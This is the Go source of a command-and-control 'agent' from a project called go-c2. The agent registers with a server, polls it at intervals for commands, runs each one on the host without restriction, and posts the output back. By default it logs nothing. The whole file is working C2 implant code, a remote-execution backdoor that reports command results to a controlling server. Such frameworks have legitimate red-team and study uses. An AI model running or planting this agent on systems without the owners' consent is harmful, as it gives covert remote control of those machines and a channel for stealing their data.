package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/chronotrax/go-c2/pkg/msgqueue"
	"github.com/google/uuid"
	"github.com/spf13/cobra"
)

func registerPost(agentID uuid.UUID, address net.IP, port uint16) error {
	url := fmt.Sprintf("http://%s:%d/agent/register/%s", address, port, agentID)
	resp, err := http.Post(url, "application/json", nil)
	if err != nil {
		return fmt.Errorf("failed to POST request: %w", err)
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println("failed to close response body")
		}
	}(resp.Body)

	if resp.StatusCode != http.StatusOK {
		// Something went wrong
		p := struct {
			Error string `json:"error"`
		}{}
		if err = json.NewDecoder(resp.Body).Decode(&p); err != nil {
			return fmt.Errorf("failed to decode response body: %w", err)
		}

		return errors.New(fmt.Sprintf("server responded with status code: %d, error: %s",
			resp.StatusCode, p.Error))
	}

	return nil
}

func commandGet(agentID uuid.UUID, address net.IP, port uint16) (*msgqueue.Message, error) {
	url := fmt.Sprintf("http://%s:%d/agent/command/%s", address, port, agentID)
	resp, err := http.Get(url)
	if err != nil {
		return nil, fmt.Errorf("failed to GET request: %w", err)
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println("failed to close response body")
		}
	}(resp.Body)

	if resp.StatusCode != http.StatusOK {
		// Something went wrong
		p := struct {
			Error string `json:"error"`
		}{}
		if err = json.NewDecoder(resp.Body).Decode(&p); err != nil {
			return nil, fmt.Errorf("failed to decode response body: %w", err)
		}

		return nil, errors.New(fmt.Sprintf("server responded with status code: %d, error: %s",
			resp.StatusCode, p.Error))
	}

	m := &msgqueue.Message{}
	if err = json.NewDecoder(resp.Body).Decode(&m); err != nil {
		return nil, fmt.Errorf("failed to decode response body: %w", err)
	}
	return m, nil
}

func commandPost(agentID uuid.UUID, address net.IP, port uint16, msg msgqueue.Message, out string) error {
	p := struct {
		msgqueue.Message `json:"message"`
		Output           string `json:"output"`
	}{msg, out}
	data, err := json.Marshal(p)
	if err != nil {
		return fmt.Errorf("failed to marshal output: %w", err)
	}

	url := fmt.Sprintf("http://%s:%d/agent/command/%s", address, port, agentID)
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("failed to POST request: %w", err)
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			log.Println("failed to close response body")
		}
	}(resp.Body)

	if resp.StatusCode != http.StatusOK {
		// Something went wrong
		p := struct {
			Error string `json:"error"`
		}{}
		if err = json.NewDecoder(resp.Body).Decode(&p); err != nil {
			return fmt.Errorf("failed to decode response body: %w", err)
		}

		return errors.New(fmt.Sprintf("server responded with status code: %d, error: %s",
			resp.StatusCode, p.Error))
	}

	return nil
}

func agentRun(cmd *cobra.Command, _ []string) {
	// Get flags
	verbose, err := cmd.Flags().GetBool("verbose")
	if err != nil {
		// Exit without printing anything
		os.Exit(1)
	}
	if !verbose {
		// Don't log anything
		log.SetOutput(io.Discard)
	}

	addressStr, err := cmd.Flags().GetString("address")
	if err != nil {
		log.Fatalln("invalid address: " + err.Error())
	}
	address := net.ParseIP(addressStr)
	if address == nil {
		log.Fatalln("invalid address")
	}

	port, err := cmd.Flags().GetUint16("port")
	if err != nil {
		log.Fatalln("invalid port")
	}

	sleep, err := cmd.Flags().GetFloat32("sleep")
	if err != nil {
		log.Fatalln("invalid sleep: " + err.Error())
	}

	idStr, err := cmd.Flags().GetString("uuid")
	if err != nil {
		log.Fatalln("invalid uuid: " + err.Error())
	}

	// Register UUID
	var id uuid.UUID
	if idStr == "" {
		id = uuid.New()
	} else if id, err = uuid.Parse(idStr); err != nil {
		log.Fatalln("invalid uuid: " + err.Error())
	}

	retry := 0
	for {
		// TODO: use HTTP2 and TLS
		err = registerPost(id, address, port)
		if err == nil {
			break
		}

		log.Println("failed to register agent: " + err.Error())

		if retry >= 10 {
			log.Fatalln("agent register failed, retry limit exceeded")
		}
		time.Sleep(3 * time.Second)
		retry++
		id = uuid.New()
	}

	// Get commands
	for {
		time.Sleep(time.Duration(sleep) * time.Second)

		msg, err := commandGet(id, address, port)
		if err != nil {
			log.Println("failed to get command: " + err.Error())
			continue
		}

		if msg.Command == "" {
			log.Println("got empty command")
			continue
		}

		log.Printf("agent got command (%s): %s %v\n", msg.MsgID, msg.Command, msg.Args)

		// Execute command
		command := exec.Command(msg.Command, msg.Args...)
		out, err := command.CombinedOutput()
		if err != nil {
			log.Println("agent execute command failed: " + err.Error())
			continue
		}
		log.Println(string(out))

		// Return result
		log.Println("sending output to server...")
		err = commandPost(id, address, port, *msg, string(out))
		if err != nil {
			log.Println("failed to post command output: " + err.Error())
		}
		log.Println("output sent to server")
	}
}

func main() {
	agentCMD := &cobra.Command{
		Use:   "agent",
		Short: "agent executes commands from go-c2 server",
		Long: `Agent registers, retrieves, and executes commands from a go-c2 server.
Defaults to checking for go-c2 server on localhost:8080.`,
		Args: cobra.NoArgs,
		Run:  agentRun,
	}
	agentCMD.Flags().StringP("address", "a", "127.0.0.1", "The IP address to look for go-c2 server (default=127.0.0.1))")
	agentCMD.Flags().Uint16P("port", "p", 8080, "The port to look for go-c2 server (default=8080)")
	agentCMD.Flags().Float32P("sleep", "s", 30, "How long to sleep (in seconds) between checking for commands (default=30)")
	agentCMD.Flags().BoolP("verbose", "v", false, "Verbose output (default=false)")
	agentCMD.Flags().StringP("uuid", "i", "", "Specify the agent UUID (defaults to random)")

	err := agentCMD.Execute()
	if err != nil {
		log.Fatalln("agent command failed: " + err.Error())
	}
}
